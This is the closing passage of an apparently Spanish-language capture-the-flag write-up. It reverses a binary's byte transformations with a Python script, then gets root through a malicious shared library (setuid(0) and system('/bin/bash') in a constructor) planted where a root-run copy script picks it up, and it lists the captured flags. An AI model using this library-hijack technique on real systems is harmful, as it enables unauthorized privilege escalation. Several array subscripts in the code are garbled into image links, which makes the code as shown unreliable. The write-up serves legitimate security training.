- El programa desde la función anterior hace unos cálculos extraños con el número de bloques para determinar la posición en la pila de la cadena que esta siendo tratada.
- `fun1` aplica una serie de transformaciones a una direccion del stack que parece ser la misma que usan el resto pero resultó ser que no.
- `fun2` no hace ninguna transformación en sus operaciones. Es para despistar.
- `fun3` no usa para nada sus parámetros, simplemente devuelve 69. Esto provoca que siempre se entre en este `if` de la función `transform`:
```C
  _var = fun3(addr_,_var);
  if (_var != 42) {
    for (local_20 = 0; local_20 < 44; local_20 = local_20 + 1) {
      for (k = 0; k < __len_expected_int; k = k + 1) {
        uVar1 = local_40[image_desc](USV_CTF_2025/img];
        _var = k % 8;
        local_61 = uVar1;
        (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
        bVar2 = fun4(uVar1,_var);
        local_40[image_desc](USV_CTF_2025/img] = bVar2 ^ 0x4f;
      }
    }
    for (j = 0; j < __len_expected_int; j = j + 1) {
      *(undefined *)(__param2 + j) = local_40[image_desc](USV_CTF_2025/img];
    }
```
- `fun4` sí hace algo relevante, es un ROR.

Podemos crear un script de python para revertir las operaciones y obtener la clave correcta:
```python
import base64

expected = bytearray(b"This_Is_Not_The_Flag_its_The_Decoded_Key")
length = len(expected)

def transform_2_1_inverse(b, n):
    # Revertir b >> (8 - n) | b << n;
    # inverse(ROR) = ROL
    # Operacion & 0xFF para mantener el tamaño de un byte
    return (b >> n | (b << (8 - n))) & 0xff 

def transform_2_inverse(input,len):
    for _ in range(44):
        for k in range(len):
            input[image_desc](USV_CTF_2025/img] ^= 0x4f
            input[image_desc](USV_CTF_2025/img] = transform_2_1_inverse(input[image_desc](USV_CTF_2025/img], k % 8)
    return input

def transform_1_inverse(input,len):
    for i in range(len):
        # Revertir input[image_desc](USV_CTF_2025/img] = (expected[image_desc](USV_CTF_2025/img] * ord('\r') ^ 0xaa)
        input[image_desc](USV_CTF_2025/img] = (input[image_desc](USV_CTF_2025/img] ^ 0xaa) // ord('\r')
        print(input)
    return input

input = transform_2_inverse(expected, length)
#input = transform_1_inverse(input, length)
input = base64.b64encode(input)
print(input.decode())
```

```
./squid `python3 decode.py`
Failed to load lib:
```

`/bin/update-lib.sh` copia la libreria en `/home/jack/dev/libsquid.so` en `/lib`. Compilamos una librería maliciosa y la ponemos en ese sitio:

```C
#include <unistd.h>
#include <stdlib.h>
// gcc -shared -fPIC -o libsquid.so libsquid.c 
__attribute__((constructor)) void init() {
  setuid(0);
  system("/bin/bash");
}
```

Esperamos a que ocurra el remplazo y ejecutamos `/usr/bin/squid VBA8T1+oJidOYCGNVLowJ0ZQNA5fqiHlX9M9Ll94MORv0DA+X4gwRQ==` para escalar privilegios y obtener la séptima y última flag:

![image_desc](USV_CTF_2025/img/2025-11-27-170328_1366x768_scrot.png)
### Flags

```
flag{fr0ntM4n.b3hind_th3_M45k}
flag{r3d.l1ght_gr33n.d34th}
flag{$quidG@me_jwT_byp@$$_succ3$$}
flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3}
flag{m4sk3d_m4n_c0ntr0l_3ntry}
flag{fr0nt_m4n_s3cr3t_4((355_k3y}
flag{Th3_G@m3_Will_N0t_End_unl3ss_Th3_W0rld_Ch@ng3s}
```
